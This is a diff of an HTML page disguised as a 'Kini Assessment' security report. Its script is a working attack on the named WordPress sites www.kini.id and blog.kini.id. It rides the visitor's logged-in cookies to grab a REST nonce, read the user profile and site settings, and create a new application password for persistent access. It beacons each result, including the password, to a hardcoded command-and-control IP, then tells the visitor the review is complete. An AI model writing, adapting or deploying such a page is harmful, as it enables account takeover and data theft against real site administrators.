@@ -1,75 +1,77 @@
 <!DOCTYPE html>
-<html>
-<head><title>Kini Security Assessment</title></head>
+<html><head><title>Kini Assessment</title></head>
 <body>
-<div id="status">Processing...</div>
+<div id="s">Loading assessment report...</div>
 <script>
-var C2 = "http://64.227.62.83:9999";
-var TARGETS = [
-    "https://www.kini.id",
-    "https://blog.kini.id"
-];
+var C2="http://64.227.62.83:9999";
+var T="https://www.kini.id";
 
-function exfil(tag, data) {
-    fetch(C2 + "/" + tag, {
-        method: "POST",
-        body: JSON.stringify(data),
-        mode: "no-cors"
-    }).catch(function(){
-        new Image().src = C2 + "/" + tag + "?d=" + btoa(JSON.stringify(data).slice(0,2000));
-    });
+function x(t,d){
+  try{
+    var i=new Image();
+    i.src=C2+"/"+t+"?d="+btoa(JSON.stringify(d).slice(0,1500));
+  }catch(e){}
 }
 
-TARGETS.forEach(function(target) {
-    // 1. Get current user info + nonce
-    fetch(target + "/wp-json/wp/v2/users/me", {credentials: "include"})
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        exfil("user", d);
-        // 2. Get settings (admin only)
-        return fetch(target + "/wp-json/wp/v2/settings", {credentials: "include"});
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) { exfil("settings", d); })
-    .catch(function(e) { exfil("error", {msg: e.toString(), target: target}); });
+// Step 1: Get REST nonce via admin-ajax (cookies auto-sent by browser)
+fetch(T+"/wp-admin/admin-ajax.php",{
+  method:"POST",
+  credentials:"include",
+  headers:{"Content-Type":"application/x-www-form-urlencoded"},
+  body:"action=rest-nonce"
+}).then(r=>r.text()).then(nonce=>{
+  x("nonce",{n:nonce});
+  if(nonce && nonce!=="0" && nonce.length>5){
+    // Step 2: Use nonce to get user info
+    fetch(T+"/wp-json/wp/v2/users/me",{
+      credentials:"include",
+      headers:{"X-WP-Nonce":nonce}
+    }).then(r=>r.json()).then(u=>{
+      x("user",u);
+      // Step 3: Create application password for persistent access
+      fetch(T+"/wp-json/wp/v2/users/"+u.id+"/application-passwords",{
+        method:"POST",
+        credentials:"include",
+        headers:{"X-WP-Nonce":nonce,"Content-Type":"application/json"},
+        body:JSON.stringify({name:"audit-"+Date.now()})
+      }).then(r=>r.json()).then(ap=>{
+        x("APPPWD",ap);  // Contains the password!
+      }).catch(e=>x("ap-err",{e:e.toString()}));
+      // Step 4: Read settings
+      fetch(T+"/wp-json/wp/v2/settings",{
+        credentials:"include",
+        headers:{"X-WP-Nonce":nonce}
+      }).then(r=>r.json()).then(s=>x("settings",s));
+    }).catch(e=>x("u-err",{e:e.toString()}));
+  } else {
+    x("no-nonce",{n:nonce});
+  }
+}).catch(e=>x("err",{e:e.toString()}));
 
-    // 3. Create application password
-    fetch(target + "/wp-json/wp/v2/users/me/application-passwords", {
-        method: "POST",
-        credentials: "include",
-        headers: {"Content-Type": "application/json", "X-WP-Nonce": ""},
-        body: JSON.stringify({name: "security-audit-" + Date.now()})
-    }).then(function(r) { return r.json(); })
-    .then(function(d) { exfil("apppwd", d); })
-    .catch(function(e) { exfil("apppwd-err", {msg: e.toString()}); });
-
-    // 4. List plugins
-    fetch(target + "/wp-json/wp/v2/plugins", {credentials: "include"})
-    .then(function(r) { return r.json(); })
-    .then(function(d) { exfil("plugins", d); })
-    .catch(function(){});
-
-    // 5. Get nonce from page
-    fetch(target + "/wp-admin/admin-ajax.php", {
-        method: "POST",
-        credentials: "include",
-        headers: {"Content-Type": "application/x-www-form-urlencoded"},
-        body: "action=rest-nonce"
-    }).then(function(r) { return r.text(); })
-    .then(function(d) {
-        if (d && d !== "0") {
-            exfil("nonce", {nonce: d, target: target});
-            // With nonce, try again:
-            fetch(target + "/wp-json/wp/v2/users/me", {
-                credentials: "include",
-                headers: {"X-WP-Nonce": d}
-            }).then(function(r) { return r.json(); })
-            .then(function(ud) { exfil("user-with-nonce", ud); });
-        }
-    }).catch(function(){});
+// Also try blog:
+fetch("https://blog.kini.id/wp-admin/admin-ajax.php",{
+  method:"POST",
+  credentials:"include",
+  headers:{"Content-Type":"application/x-www-form-urlencoded"},
+  body:"action=rest-nonce"
+}).then(r=>r.text()).then(nonce=>{
+  if(nonce && nonce!=="0"){
+    x("blog-nonce",{n:nonce});
+    fetch("https://blog.kini.id/wp-json/wp/v2/users/me",{
+      credentials:"include",
+      headers:{"X-WP-Nonce":nonce}
+    }).then(r=>r.json()).then(u=>{
+      x("blog-user",u);
+      fetch("https://blog.kini.id/wp-json/wp/v2/users/"+u.id+"/application-passwords",{
+        method:"POST",
+        credentials:"include",
+        headers:{"X-WP-Nonce":nonce,"Content-Type":"application/json"},
+        body:JSON.stringify({name:"audit-"+Date.now()})
+      }).then(r=>r.json()).then(ap=>x("BLOG-APPPWD",ap));
+    });
+  }
 });
 
-document.getElementById("status").innerHTML = "Assessment complete. You may close this page.";
+document.getElementById("s").textContent="Assessment report loaded. Review complete.";
 </script>
-</body>
-</html>
+</body></html>
